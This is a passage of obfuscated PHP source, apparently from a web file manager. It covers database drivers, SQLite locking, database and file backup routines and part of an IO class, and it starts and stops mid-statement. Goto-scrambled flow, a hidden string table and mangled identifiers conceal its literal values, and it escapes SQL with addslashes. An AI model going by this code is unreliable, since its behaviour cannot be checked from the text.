6c\x65\137\156\x61\155\x65\x20\x3d\40\143\56\x74\x61\142\154\145\137\156\x61\155\145\xa\x9\x9\x57\x48\x45\x52\x45\x20\x20\40\x74\56\164\141\x62\x6c\x65\x5f\156\x61\x6d\x65\40\x3d\40\x27{$E×¢§ŒÃÜŞ}\47"; break; case $Fƒİß¬¥è[842]: $E·¡šÅ¡ = $Fƒİß¬¥è[843] . $E×¢§ŒÃÜŞ . $Fƒİß¬¥è[844]; break; case $Fƒİß¬¥è[824]: case $Fƒİß¬¥è[826]: $E·¡šÅ¡ = $Fƒİß¬¥è[845] . $Fƒİß¬¥è[846] . $Fƒİß¬¥è[847] . strtoupper($E×¢§ŒÃÜŞ) . $Fƒİß¬¥è[848] . strtoupper($E×¢§ŒÃÜŞ) . $Fƒİß¬¥è[849]; break; case $Fƒİß¬¥è[850]: $E·¡šÅ¡ = $Fƒİß¬¥è[851] . $E×¢§ŒÃÜŞ . $Fƒİß¬¥è[852]; break; case $Fƒİß¬¥è[825]: break; case $Fƒİß¬¥è[853]: default: $E·¡šÅ¡ = $Fƒİß¬¥è[854] . ($this->dbType == $Fƒİß¬¥è[853] ? "\x60{$E×¢§ŒÃÜŞ}\140" : $E×¢§ŒÃÜŞ); } } goto CŸµÏï±Ç„; c¾êÁŒ¾: return $féĞéã¥±; goto aÌñÆòŸá; aÌñÆòŸá: } public function getTables($bÓÕªÆİ–œ = '') { $FŒï£ÉŒÓ® =& $_SERVER[îÖ]; if (think_config($FŒï£ÉŒÓ®[856])) { $cáĞŒ—ø†Ô = str_replace($FŒï£ÉŒÓ®[857], $bÓÕªÆİ–œ, think_config($FŒï£ÉŒÓ®[856])); } else { switch ($this->dbType) { case $FŒï£ÉŒÓ®[824]: case $FŒï£ÉŒÓ®[826]: $cáĞŒ—ø†Ô = $FŒï£ÉŒÓ®[858]; break; case $FŒï£ÉŒÓ®[823]: case $FŒï£ÉŒÓ®[841]: $cáĞŒ—ø†Ô = $FŒï£ÉŒÓ®[859]; break; case $FŒï£ÉŒÓ®[850]: $cáĞŒ—ø†Ô = $FŒï£ÉŒÓ®[860]; break; case $FŒï£ÉŒÓ®[825]: think_exception(think_lang($FŒï£ÉŒÓ®[861]) . $FŒï£ÉŒÓ®[862]); break; case $FŒï£ÉŒÓ®[842]: $cáĞŒ—ø†Ô = $FŒï£ÉŒÓ®[42] . $FŒï£ÉŒÓ®[43] . $FŒï£ÉŒÓ®[44]; break; case $FŒï£ÉŒÓ®[853]: default: if (!empty($bÓÕªÆİ–œ)) { $cáĞŒ—ø†Ô = $FŒï£ÉŒÓ®[806] . $bÓÕªÆİ–œ; } else { $cáĞŒ—ø†Ô = $FŒï£ÉŒÓ®[807]; } } } $Añ¸‘šŞ‹Î = $this->query($cáĞŒ—ø†Ô); $fø¿Å·¾ì® = array(); foreach ($Añ¸‘šŞ‹Î as $b•Ã©É×Éˆ => $B°ÚÇç¹) { $fø¿Å·¾ì®[$b•Ã©É×Éˆ] = current($B°ÚÇç¹); } return $fø¿Å·¾ì®; } protected function parseLimit($B£Ò«ƒ× ˆ) { $d²íÑ¡Úî =& $_SERVER[îÖ]; $eŠ‘Úƒ £ = $d²íÑ¡Úî[33]; if (!empty($B£Ò«ƒ× ˆ)) { switch ($this->dbType) { case $d²íÑ¡Úî[850]: case $d²íÑ¡Úî[842]: $B£Ò«ƒ× ˆ = explode($d²íÑ¡Úî[47], $B£Ò«ƒ× ˆ); if (count($B£Ò«ƒ× ˆ) > 1) { $eŠ‘Úƒ £ .= $d²íÑ¡Úî[48] . $B£Ò«ƒ× ˆ[1] . $d²íÑ¡Úî[49] . $B£Ò«ƒ× ˆ[0] . $d²íÑ¡Úî[50]; } else { $eŠ‘Úƒ £ .= $d²íÑ¡Úî[48] . $B£Ò«ƒ× ˆ[0] . $d²íÑ¡Úî[50]; } break; case $d²íÑ¡Úî[823]: case $d²íÑ¡Úî[841]: break; case $d²íÑ¡Úî[825]: break; case $d²íÑ¡Úî[824]: case $d²íÑ¡Úî[826]: break; case $d²íÑ¡Úî[853]: default: $eŠ‘Úƒ £ .= $d²íÑ¡Úî[48] . $B£Ò«ƒ× ˆ . $d²íÑ¡Úî[50]; } } return $eŠ‘Úƒ £; } public function parseKey(&$a³ŠÈŠ‹Ù», $C™§›ÃÒÃù = true) { $cö—±¾¯Í‚ =& $_SERVER[îÖ]; if ($C™§›ÃÒÃù) { $a³ŠÈŠ‹Ù» = $this->parseKeyCheck($a³ŠÈŠ‹Ù»); } if ($this->dbType == $cö—±¾¯Í‚[853]) { if ($a³ŠÈŠ‹Ù» != $cö—±¾¯Í‚[176] && !preg_match($cö—±¾¯Í‚[817], $a³ŠÈŠ‹Ù»)) { $a³ŠÈŠ‹Ù» = $cö—±¾¯Í‚[818] . trim($a³ŠÈŠ‹Ù», $cö—±¾¯Í‚[818]) . $cö—±¾¯Í‚[818]; } return $a³ŠÈŠ‹Ù»; } else { return parent::parseKey($a³ŠÈŠ‹Ù»); } } public function close() { $this->_linkID = null; } public function error() { $B²¸˜ÊÙÍ =& $_SERVER[îÖ]; if ($this->PDOStatement) { $A¡–’ÈÆÌì = $this->PDOStatement->errorInfo(); $this->error = $A¡–’ÈÆÌì[1] . $B²¸˜ÊÙÍ[4] . $A¡–’ÈÆÌì[2]; } else { $this->error = $B²¸˜ÊÙÍ[33]; } if ($B²¸˜ÊÙÍ[33] != $this->queryStr) { $this->error .= LNG($B²¸˜ÊÙÍ[45]) . $this->queryStr; } think_trace($this->error, $B²¸˜ÊÙÍ[33], $B²¸˜ÊÙÍ[46]); return $this->error; } public function escapeString($FÏ‡ã¼¨) { $dİÛ„ŠË· =& $_SERVER[îÖ]; switch ($this->dbType) { case $dİÛ„ŠË·[850]: case $dİÛ„ŠË·[823]: case $dİÛ„ŠË·[841]: case $dİÛ„ŠË·[853]: return addslashes($FÏ‡ã¼¨); case $dİÛ„ŠË·[825]: case $dİÛ„ŠË·[842]: case $dİÛ„ŠË·[824]: case $dİÛ„ŠË·[826]: return str_ireplace($dİÛ„ŠË·[55], $dİÛ„ŠË·[56], $FÏ‡ã¼¨); } } protected function parseValue($cµÀĞñ…É¬) { $eó’´ºŠ¼ï =& $_SERVER[îÖ]; if (is_string($cµÀĞñ…É¬)) { $cµÀĞñ…É¬ = strpos($cµÀĞñ…É¬, $eó’´ºŠ¼ï[4]) === 0 ? $this->escapeString($cµÀĞñ…É¬) : $eó’´ºŠ¼ï[863] . $this->escapeString($cµÀĞñ…É¬) . $eó’´ºŠ¼ï[863]; } elseif (isset($cµÀĞñ…É¬[0]) && is_string($cµÀĞñ…É¬[0]) && strtolower($cµÀĞñ…É¬[0]) == $eó’´ºŠ¼ï[285]) { $cµÀĞñ…É¬ = $this->escapeString($cµÀĞñ…É¬[1]); } elseif (is_array($cµÀĞñ…É¬)) { $cµÀĞñ…É¬ = array_map(array($this, $eó’´ºŠ¼ï[864]), $cµÀĞñ…É¬); } elseif (is_bool($cµÀĞñ…É¬)) { $cµÀĞñ…É¬ = $cµÀĞñ…É¬ ? $eó’´ºŠ¼ï[83] : $eó’´ºŠ¼ï[468]; } elseif (is_null($cµÀĞñ…É¬)) { $cµÀĞñ…É¬ = $eó’´ºŠ¼ï[99]; } return $cµÀĞñ…É¬; } public function getLastInsertId() { $DäŒŒ™òÃ± =& $_SERVER[îÖ]; switch ($this->dbType) { case $DäŒŒ™òÃ±[850]: case $DäŒŒ™òÃ±[842]: case $DäŒŒ™òÃ±[823]: case $DäŒŒ™òÃ±[841]: case $DäŒŒ™òÃ±[825]: case $DäŒŒ™òÃ±[853]: return $this->_linkID->lastInsertId(); case $DäŒŒ™òÃ±[824]: case $DäŒŒ™òÃ±[826]: $B‹Ë®÷ä‡Û = $this->table; $B»Ş˜òå‡¨ = $this->query("\123\105\114\105\103\124\40{$B‹Ë®÷ä‡Û}\56\143\x75\162\x72\x76\141\154\x20\x63\x75\x72\x72\166\141\154\40\x46\122\117\x4d\x20\x64\x75\x61\x6c"); return $B»Ş˜òå‡¨ ? $B»Ş˜òå‡¨[0][$DäŒŒ™òÃ±[865]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($d¼İéÉå) { goto Céß½±±ØØ; A“ÜãÃ©ìÜ: fclose($c®Åªè´ÈĞ); show_json($eêƒé‡Š‘Ò[868], !1); return !1; goto dÜåã×Œ‰É; aë»õÁÓÏ›: if (!$c®Åªè´ÈĞ) { return !1; } if (flock($c®Åªè´ÈĞ, LOCK_EX)) { $F³ÒÎ’äõ = parent::query($d¼İéÉå); flock($c®Åªè´ÈĞ, LOCK_UN); fclose($c®Åªè´ÈĞ); return $F³ÒÎ’äõ; } flock($c®Åªè´ÈĞ, LOCK_UN); goto A“ÜãÃ©ìÜ; Céß½±±ØØ: $eêƒé‡Š‘Ò =& $_SERVER[îÖ]; $DŸÂ‘æ° = DATA_PATH . $eêƒé‡Š‘Ò[866]; $c®Åªè´ÈĞ = fopen($DŸÂ‘æ°, $eêƒé‡Š‘Ò[867]); goto aë»õÁÓÏ›; dÜåã×Œ‰É: } public function execute($D‰ŞóùùÔ²) { goto c­Â¹Û„®œ; bŠšì—âŸæ: fclose($b‹×ƒœ›Œ); show_json($aÒÊ»¹·Ó[868], !1); return !1; goto A£¬Ö¥õ§; c­Â¹Û„®œ: $aÒÊ»¹·Ó =& $_SERVER[îÖ]; $d„íÀ‰Ö“ì = DATA_PATH . $aÒÊ»¹·Ó[866]; $b‹×ƒœ›Œ = fopen($d„íÀ‰Ö“ì, $aÒÊ»¹·Ó[867]); goto aÏ¢ì‡ÖÆ; aÏ¢ì‡ÖÆ: if (!$b‹×ƒœ›Œ) { return !1; } if (flock($b‹×ƒœ›Œ, LOCK_EX)) { $B›îŒØšªö = parent::execute($D‰ŞóùùÔ²); flock($b‹×ƒœ›Œ, LOCK_UN); fclose($b‹×ƒœ›Œ); return $B›îŒØšªö; } flock($b‹×ƒœ›Œ, LOCK_UN); goto bŠšì—âŸæ; A£¬Ö¥õ§: } } goto f¦ÅÖ’»Æ‡; dˆ³Á‘Ş¼¡: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto Aô‰ËÆòªò; FÈƒÊÄ™Û: Backup::set($e—ÒÍèë«¥); return !0; goto C¨Àñá‚Š; Aô‰ËÆòªò: $B¹¡Ã„§Ğç =& $_SERVER[îÖ]; $dß¸ê ­Çò = Backup::get(); self::$io = $dß¸ê ­Çò[$B¹¡Ã„§Ğç[690]]; goto c“¬‹·Ş™ê; AõÖÄ´Ÿš›: mk_dir($dØ×ÏÔÜ‚); $E¡ê‚àˆè = $bÒ­ÊÃÊÑÊ = 0; $dÂçĞ³™Š = $Cœõ¹¢é½->db()->getTables(); goto f¦î£»²Ÿò; c“¬‹·Ş™ê: self::$name = $dß¸ê ­Çò[$B¹¡Ã„§Ğç[28]]; $bš¢šÒ“°ô = $GLOBALS[$B¹¡Ã„§Ğç[6]][$B¹¡Ã„§Ğç[17]]; $f¨°³¨‰ÅÂ = $this->_dbType($bš¢šÒ“°ô); goto D¶±áëÇÂ¨; D¶±áëÇÂ¨: $Cœõ¹¢é½ = new DbManage($bš¢šÒ“°ô, $f¨°³¨‰ÅÂ); $dØ×ÏÔÜ‚ = TEMP_FILES . $B¹¡Ã„§Ğç[709] . self::$name . $B¹¡Ã„§Ğç[8]; del_dir($dØ×ÏÔÜ‚); goto AõÖÄ´Ÿš›; B§ã×èŞÒ: foreach ($dÂçĞ³™Š as $d°ƒ‡‘¾ø) { $cÛãÌâ‚¥ = $dØ×ÏÔÜ‚ . $d°ƒ‡‘¾ø . $B¹¡Ã„§Ğç[717]; $bºöÉÕ = null; if ($d°ƒ‡‘¾ø == $B¹¡Ã„§Ğç[718] && (!isset($dß¸ê ­Çò[$B¹¡Ã„§Ğç[691]]) || $dß¸ê ­Çò[$B¹¡Ã„§Ğç[691]] == $B¹¡Ã„§Ğç[468])) { $bºöÉÕ = self::$io; } $bÒ­ÊÃÊÑÊ += $Cœõ¹¢é½->sqlFromDb($d°ƒ‡‘¾ø, $cÛãÌâ‚¥, $F¨ĞÛ«†ÌÆ, $bºöÉÕ); } $F¨ĞÛ«†ÌÆ->end(); $e—ÒÍèë«¥ = array($B¹¡Ã„§Ğç[719] => $f¨°³¨‰ÅÂ, $B¹¡Ã„§Ğç[706] => 1, $B¹¡Ã„§Ğç[720] => $bÒ­ÊÃÊÑÊ, $B¹¡Ã„§Ğç[721] => $bÒ­ÊÃÊÑÊ); goto FÈƒÊÄ™Û; f¦î£»²Ÿò: $dÂçĞ³™Š = array_diff($dÂçĞ³™Š, array($B¹¡Ã„§Ğç[710], $B¹¡Ã„§Ğç[711])); foreach ($dÂçĞ³™Š as $d°ƒ‡‘¾ø) { $E¡ê‚àˆè += $Cœõ¹¢é½->model($d°ƒ‡‘¾ø)->count(); } $F¨ĞÛ«†ÌÆ = new Task($B¹¡Ã„§Ğç[712], $B¹¡Ã„§Ğç[713], $E¡ê‚àˆè, LNG($B¹¡Ã„§Ğç[714]) . $B¹¡Ã„§Ğç[715] . LNG($B¹¡Ã„§Ğç[716])); goto B§ã×èŞÒ; C¨Àñá‚Š: } private function _dbType($C¶è¿Şìã) { goto EÇ·ª‹±²; f„¿ùÔ†ˆÌ: return $eÑç‡ÏˆØ¦; goto fŸåõŸ·êğ; EÇ·ª‹±²: $eÍàåà–„Î =& $_SERVER[îÖ]; $C¶è¿Şìã = array_change_key_case($C¶è¿Şìã); $eÑç‡ÏˆØ¦ = $C¶è¿Şìã[$eÍàåà–„Î[722]]; goto D—ÕÛ‘•øÏ; D—ÕÛ‘•øÏ: if ($eÑç‡ÏˆØ¦ == $eÍàåà–„Î[723]) { $a©”…¾‚ = explode($eÍàåà–„Î[4], $C¶è¿Şìã[$eÍàåà–„Î[724]]); $eÑç‡ÏˆØ¦ = $a©”…¾‚[0]; } $Cãï¹¥Ç½ = array($eÍàåà–„Î[725] => $eÍàåà–„Î[9], $eÍàåà–„Î[726] => $eÍàåà–„Î[727]); if (isset($Cãï¹¥Ç½[$eÑç‡ÏˆØ¦])) { $eÑç‡ÏˆØ¦ = $Cãï¹¥Ç½[$eÑç‡ÏˆØ¦]; } goto f„¿ùÔ†ˆÌ; fŸåõŸ·êğ: } } class BackupDbFile { public function __construct() { } public function index() { goto C–óÉÍ©íÓ; bÛªßŠ¤¢¹: $FéíÖĞÑè³->end(); Backup::set(array($bŒÏğòˆÔÌ[733] => $F¹»£ß—ˆß[$bŒÏğòˆÔÌ[77]])); return !0; goto C¤»èæƒ©; F«®…ŒãÓ²: $bµŠÌÕ¹íÔ = TEMP_FILES . "\142\x61\143\x6b\x75\x70\x5f{$A¾ÃÆÆ’Û¨}\57"; $A·¡“ƒ®Û¬ = "\x7b\151\x6f\72{$aè˜ŠƒÖ ·[$bŒÏğòˆÔÌ[690]]}\175\x2f\x64\x61\164\x61\142\141\x73\x65\57"; IO::mkdir($A·¡“ƒ®Û¬ . "\x62\141\143\x6b\165\160\x5f{$A¾ÃÆÆ’Û¨}\57"); goto cğŸ˜›ğº; c§”×¸±: Backup::set(array($bŒÏğòˆÔÌ[730] => $F¹»£ß—ˆß[$bŒÏğòˆÔÌ[77]])); IO::move($bµŠÌÕ¹íÔ, $A·¡“ƒ®Û¬); $D¨ˆÅƒ§Ó† = CONTROLLER_DIR . $bŒÏğòˆÔÌ[731]; goto DÀò…„ğ¥œ; DÀò…„ğ¥œ: $a¯¦Å¢öĞ› = CONTROLLER_DIR . $bŒÏğòˆÔÌ[732]; IO::copy($D¨ˆÅƒ§Ó†, $A·¡“ƒ®Û¬ . "\142\x61\x63\x6b\x75\x70\137{$A¾ÃÆÆ’Û¨}\x2f"); IO::copy($a¯¦Å¢öĞ›, $A·¡“ƒ®Û¬ . "\x62\141\x63\153\x75\x70\x5f{$A¾ÃÆÆ’Û¨}\x2f"); goto bÛªßŠ¤¢¹; cğŸ˜›ğº: $FéíÖĞÑè³ = new TaskFileTransfer($bŒÏğòˆÔÌ[728], $bŒÏğòˆÔÌ[713], 0, LNG($bŒÏğòˆÔÌ[714]) . $bŒÏğòˆÔÌ[412] . LNG($bŒÏğòˆÔÌ[716]) . $bŒÏğòˆÔÌ[729]); $FéíÖĞÑè³->addPath($bµŠÌÕ¹íÔ); $F¹»£ß—ˆß = IO::infoWithChildren($bµŠÌÕ¹íÔ); goto c§”×¸±; C–óÉÍ©íÓ: $bŒÏğòˆÔÌ =& $_SERVER[îÖ]; $aè˜ŠƒÖ · = Backup::get(); $A¾ÃÆÆ’Û¨ = $aè˜ŠƒÖ ·[$bŒÏğòˆÔÌ[28]]; goto F«®…ŒãÓ²; C¤»èæƒ©: } } class BackupFile { public function __construct() { } public function index() { goto A˜³ìÃÌæÒ; B¦—‡ŠÖÜ¦: $d•À»…øåÄ = 1000; $d¯ãÎéæ = $cÎó¾¯ˆÇ = 0; $Aìö†ñ¢ÌĞ = array(); goto dÄÊª— ; b’½Õ¦–¿: $a·Š®ŸÓ¾… = $f´–òå¦Û ? 1 : 0; $c½¥äŸ¸™ = array($_SERVER[îÖ][750] => 1, $_SERVER[îÖ][702] => time(), $_SERVER[îÖ][708] => $a·Š®ŸÓ¾…, $_SERVER[îÖ][747] => $FíÓ†Ä†Å¾, $_SERVER[îÖ][739] => $C ×¸Ôèµ‡, $_SERVER[îÖ][738] => $f±’ÖŸ…Â); if ($cÎó¾¯ˆÇ) { $c½¥äŸ¸™[$_SERVER[îÖ][748]] = $CÃ”ØÓ¤‚â; $c½¥äŸ¸™[$_SERVER[îÖ][749]] = $fÈ–‹²Í–; } goto E“±Üßƒ¿“; AÓÙê¼…‰…: $f±’ÖŸ…Â = (int) Model($_SERVER[îÖ][718])->where($dŒÃƒ°îŠÃ)->count($_SERVER[îÖ][419]); $C ×¸Ôèµ‡ = (int) Model($_SERVER[îÖ][718])->where($dŒÃƒ°îŠÃ)->sum($_SERVER[îÖ][77]); $DÜÛŞÔà÷³ = new TaskFileTransfer($_SERVER[îÖ][736], $_SERVER[îÖ][713], $f±’ÖŸ…Â, LNG($_SERVER[îÖ][714]) . $_SERVER[îÖ][715] . LNG($_SERVER[îÖ][737])); goto d•Ş«ÜÎİ¸; b‚¼Ë‹½¾: $f´–òå¦Û = !0; $B·ïïÍæ® = $this->storeIds(); $eÌÌ¬Õ²Şñ = 1; goto B¦—‡ŠÖÜ¦; d•Ş«ÜÎİ¸: $DÜÛŞÔà÷³->task[$_SERVER[îÖ][697]] = $C ×¸Ôèµ‡; $c½¥äŸ¸™ = array($_SERVER[îÖ][738] => $f±’ÖŸ…Â, $_SERVER[îÖ][739] => $C ×¸Ôèµ‡); Backup::set($c½¥äŸ¸™); goto b‚¼Ë‹½¾; E“±Üßƒ¿“: Backup::set($c½¥äŸ¸™); $this->_fileFilter($Aìö†ñ¢ÌĞ); return !0; goto bŞ–¿‡İƒ; A˜³ìÃÌæÒ: $F¥¦í = Backup::get(); $FíÓ†Ä†Å¾ = $F¥¦í[$_SERVER[îÖ][281]][$_SERVER[îÖ][167]][$_SERVER[îÖ][419]]; $dŒÃƒ°îŠÃ = array($_SERVER[îÖ][420] => array($_SERVER[îÖ][734], $FíÓ†Ä†Å¾), $_SERVER[îÖ][735] => array($_SERVER[îÖ][319], $F¥¦í[$_SERVER[îÖ][690]])); goto AÓÙê¼…‰…; dÄÊª— : $fÈ–‹²Í– = $CÃ”ØÓ¤‚â = 0; do { $dÒ«×†Í¶¦ = $_SERVER[îÖ][740]; $AÓğè˜½¶Ë = Model($_SERVER[îÖ][718])->where($dŒÃƒ°îŠÃ)->field($dÒ«×†Í¶¦)->order($_SERVER[îÖ][741])->selectPage($d•À»…øåÄ, $eÌÌ¬Õ²Şñ); $bÁ×ãÕ±íí = !empty($AÓğè˜½¶Ë[$_SERVER[îÖ][354]]) ? $AÓğè˜½¶Ë[$_SERVER[îÖ][354]] : array(); foreach ($bÁ×ãÕ±íí as $Eêİ‡¥Åà‡) { goto b©ïÏïØä; Eôƒ³‘: $d¯ãÎéæ += $Eêİ‡¥Åà‡[$_SERVER[îÖ][77]]; $CÃ”ØÓ¤‚â += 1; $fÈ–‹²Í– += $Eêİ‡¥Åà‡[$_SERVER[îÖ][77]]; goto aÑ‹¸îˆÅø; aÑ‹¸îˆÅø: if ($d¯ãÎéæ >= 1024 * 1024 * 100) { $c½¥äŸ¸™ = array($_SERVER[îÖ][747] => $FíÓ†Ä†Å¾, $_SERVER[îÖ][748] => $CÃ”ØÓ¤‚â, $_SERVER[îÖ][749] => $fÈ–‹²Í–); Backup::set($c½¥äŸ¸™); $d¯ãÎéæ = $cÎó¾¯ˆÇ = 0; } goto cÊ´‚²»Øí; b©ïÏïØä: if (!$this->_fileExist($Eêİ‡¥Åà‡, $Aìö†ñ¢ÌĞ, $B·ïïÍæ®)) { $f±’ÖŸ…Â -= 1; $C ×¸Ôèµ‡ -= (int) $Eêİ‡¥Åà‡[$_SERVER[îÖ][77]]; write_log("\x66\151\x6c\145\x20\x6e\157\164\40\x65\x78\151\x73\x74\56\x66\151\154\145\111\x44\72{$Eêİ‡¥Åà‡[$_SERVER[îÖ][419]]}\54\40\160\141\x74\x68\x3a{$Eêİ‡¥Åà‡[$_SERVER[îÖ][75]]}", $_SERVER[îÖ][742]); continue; } $AÉ˜Å£ = $Eêİ‡¥Åà‡[$_SERVER[îÖ][75]]; $Fäáá±” = "\173\x69\157\72{$F¥¦í[$_SERVER[îÖ][690]]}\x7d" . substr($AÉ˜Å£, strlen("\x7b\x69\157\72{$Eêİ‡¥Åà‡[$_SERVER[îÖ][743]]}\175")); goto aÍøĞŒñˆÅ; aÍøĞŒñˆÅ: if (IO::exist($Fäáá±”)) { $DÜÛŞÔà÷³->updateFileEnd($Eêİ‡¥Åà‡[$_SERVER[îÖ][28]], $Eêİ‡¥Åà‡[$_SERVER[îÖ][77]]); } else { $Fäáá±” = get_path_father($Fäáá±”); IO::mkdir($Fäáá±”); if (!IO::copy($AÉ˜Å£, $Fäáá±”, $_SERVER[îÖ][744])) { write_log($_SERVER[îÖ][745] . $AÉ˜Å£ . $_SERVER[îÖ][746] . $Fäáá±” . $_SERVER[îÖ][476], $_SERVER[îÖ][713]); $f´–òå¦Û = !1; break; } } $FíÓ†Ä†Å¾ = $Eêİ‡¥Åà‡[$_SERVER[îÖ][419]]; $cÎó¾¯ˆÇ += 1; goto Eôƒ³‘; cÊ´‚²»Øí: } $E··ÑÙ° = count($bÁ×ãÕ±íí); $eÌÌ¬Õ²Şñ++; } while ($E··ÑÙ° == $d•À»…øåÄ); $DÜÛŞÔà÷³->end(); goto b’½Õ¦–¿; bŞ–¿‡İƒ: } private function _fileExist($dÇìÂğƒŸ†, &$c¯¦¾¶’×÷, $Cõí¿ùğß) { goto eÀÒ³º¸è; eî„ƒÏ¦›Ì: $c¯¦¾¶’×÷ = array_merge($c¯¦¾¶’×÷, array_to_keyvalue($C¡ã¶¯’Óí, $e…ë Í°éÊ[33], $e…ë Í°éÊ[419])); return !1; goto Fá’¹©±×; eÀÒ³º¸è: $e…ë Í°éÊ =& $_SERVER[îÖ]; $B°æ‡Ø†ƒ = $dÇìÂğƒŸ†[$e…ë Í°éÊ[75]]; if (in_array($dÇìÂğƒŸ†[$e…ë Í°éÊ[419]], $c¯¦¾¶’×÷)) { return !1; } goto FÌÒÔ¡¥¸Ü; FÌÒÔ¡¥¸Ü: if (!in_array($dÇìÂğƒŸ†[$e…ë Í°éÊ[743]], $Cõí¿ùğß)) { return !1; } if (IO::exist($B°æ‡Ø†ƒ)) { return !0; } $D‚èºµ— = get_path_father($B°æ‡Ø†ƒ); goto eÀÑÉˆ“š; eÀÑÉˆ“š: if (IO::exist($D‚èºµ—)) { $c¯¦¾¶’×÷[] = $dÇìÂğƒŸ†[$e…ë Í°éÊ[419]]; return !1; } $cñÚ¯Ï¿« = array($e…ë Í°éÊ[743] => $dÇìÂğƒŸ†[$e…ë Í°éÊ[743]], $e…ë Í°éÊ[75] => array($e…ë Í°éÊ[751], "{$D‚èºµ—}\45")); $C¡ã¶¯’Óí = Model($e…ë Í°éÊ[718])->where($cñÚ¯Ï¿«)->field($e…ë Í°éÊ[420])->select(); goto eî„ƒÏ¦›Ì; Fá’¹©±×: } private function _fileFilter($d¸¨´¿Ÿ£Ş) { $eõ‡Ê¦´Öå =& $_SERVER[îÖ]; if (empty($d¸¨´¿Ÿ£Ş)) { return; } $FçğæÁó¾ñ = array($eõ‡Ê¦´Öå[419] => array($eõ‡Ê¦´Öå[7], array_unique($d¸¨´¿Ÿ£Ş))); $b‰Û½Ì¸…é = Model($eõ‡Ê¦´Öå[752])->where($FçğæÁó¾ñ)->field($eõ‡Ê¦´Öå[369])->select(); foreach ($b‰Û½Ì¸…é as $eÖŒ²Æñ®) { Model($eõ‡Ê¦´Öå[752])->remove($eÖŒ²Æñ®[$eõ‡Ê¦´Öå[369]], !1); } } private function storeIds() { $cÛªŞŠöİ— =& $_SERVER[îÖ]; $B¸¯½µ¡İƒ = Model($cÛªŞŠöİ—[703])->listData(); $dÉåäÒÃİß = array(); $bÀŠ¤°Å©â = $GLOBALS[$cÛªŞŠöİ—[6]][$cÛªŞŠöİ—[84]][$cÛªŞŠöİ—[753]]; foreach ($B¸¯½µ¡İƒ as $déïÊ§¹£‘) { $FÃôÎÚµµ‹ = strtolower($déïÊ§¹£‘[$cÛªŞŠöİ—[90]]); if (!isset($bÀŠ¤°Å©â[$FÃôÎÚµµ‹])) { continue; } $c°‚›À  = $cÛªŞŠöİ—[71] . (isset($bÀŠ¤°Å©â[$FÃôÎÚµµ‹]) ? $bÀŠ¤°Å©â[$FÃôÎÚµµ‹] : ucfirst($FÃôÎÚµµ‹)); if (!class_exists($c°‚›À )) { continue; } $dÉåäÒÃİß[] = $déïÊ§¹£‘[$cÛªŞŠöİ—[367]]; } return $dÉåäÒÃİß; } } goto AËõŞÔ›”; dƒæï¥œœ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($F¸ÉÈÑ…Ø’, $bÑçŒƒíùÔ) { $AÔÓ‡•‡ÙÈ = self::driverMake($bÑçŒƒíùÔ[0]); if (method_exists($AÔÓ‡•‡ÙÈ, $F¸ÉÈÑ…Ø’)) { return @call_user_func_array(array($AÔÓ‡•‡ÙÈ, $F¸ÉÈÑ…Ø’), $bÑçŒƒíùÔ); } if (method_exists($AÔÓ‡•‡ÙÈ, $_SERVER[îÖ][991])) { return @call_user_func_array(array($AÔÓ‡•‡ÙÈ, $F¸ÉÈÑ…Ø’), $bÑçŒƒíùÔ); } else { if (method_exists(self, $F¸ÉÈÑ…Ø’)) { return @call_user_func_array(array(self, $F¸ÉÈÑ…Ø’), $bÑçŒƒíùÔ); } else { call_user_func_array(array(parent, $F¸ÉÈÑ…Ø’), $bÑçŒƒíùÔ); } } } public static function init($F ¹ö–•ò®) { return self::driverMake($F ¹ö–•ò®); } public static function copy($D¨¨÷‹®‹ö, $f¸èÍË·…”, $f¢»†Ä‹·¾ = false, $d¤½†“óÅ× = false) { return self::copyMove($D¨¨÷‹®‹ö, $f¸èÍË·…”, $f¢»†Ä‹·¾, $_SERVER[îÖ][490], $d¤½†“óÅ×); } public static function move($FÄàÊ¦¾Çâ, $CÑ¥‚ÂùÅ™, $dƒ÷”Ã¼¸— = false, $B¬‚¥Û¬ä× = false) { return self::copyMove($FÄàÊ¦¾Çâ, $CÑ¥‚ÂùÅ™, $dƒ÷”Ã¼¸—, $_SERVER[îÖ][492], $B¬‚¥Û¬ä×); } public static function saveFile($a¬‹¤æÔùš, $c¬ÍÎœÕ×Ó, $FÉ‰â‡íÚ = true) { goto DÚ’ÉÒ…øõ; DÚ’ÉÒ…øõ: $Càãó®òŠ‡ =& $_SERVER[îÖ]; $D¹‡çØ¼°£ = self::info($c¬ÍÎœÕ×Ó); $añÕõÈç› = self::driverMake($a¬‹¤æÔùš); goto F™Üß°ÆÕ; a·—Ä ¥ôá: $f´‹í¤ô¥ë = self::copyFile($añÕõÈç›, $a¬‹¤æÔùš, $E ˆÈÁÍ«, $A‘Ç Ë–ë, $D¹‡çØ¼°£[$Càãó®òŠ‡[28]], $Eùó—†àŠ); if ($B¿Âä¦ ­) { $f´‹í¤ô¥ë = $B¿Âä¦ ­->getPathOuter($f´‹í¤ô¥ë); } return $f´‹í¤ô¥ë; goto bßİ£ë˜éè; EœÛñ°ãÚ: $A‘Ç Ë–ë = $E ˆÈÁÍ«->pathFather($c¬ÍÎœÕ×Ó); $Eùó—†àŠ = !0; if (!$FÉ‰â‡íÚ && self::driverIsSame($añÕõÈç›, $E ˆÈÁÍ«)) { $Eùó—†àŠ = !1; } goto a·—Ä ¥ôá; F™Üß°ÆÕ: $E ˆÈÁÍ« = self::driverMake($c¬ÍÎœÕ×Ó); $B¿Âä¦ ­ = !1; if ($E ˆÈÁÍ«->pathParse[$Càãó®òŠ‡[992]]) { $C–ê­É£Õ® = $E ˆÈÁÍ«->pathParse[$Càãó®òŠ‡[992]]; $B¿Âä¦ ­ = $E ˆÈÁÍ«; $E ˆÈÁÍ« = self::driverMake($C–ê­É£Õ®); } goto EœÛñ°ãÚ; bßİ£ë˜éè: } private static function copyMove($EŠÍ¨Ìï, $Fê‹ãÀÊ‘, $aÅĞ¾Íâç, $B§ô×Œ¬ÕÀ, $D†­Ÿ›“‡¬ = false) { goto Cô¶âÕĞ¤Š; A­ï‚´§×º: if ($D«ËÚÊ÷‹’) { $cã¨³ÜÜí¬ = $D«ËÚÊ÷‹’->getPathOuter($cã¨³ÜÜí¬); } return $cã¨³ÜÜí¬; goto d¢Ä»†¤¯; CÜ¼÷Èğ†¬: Hook::trigger($Dì‡¼µ®ÖË[72], 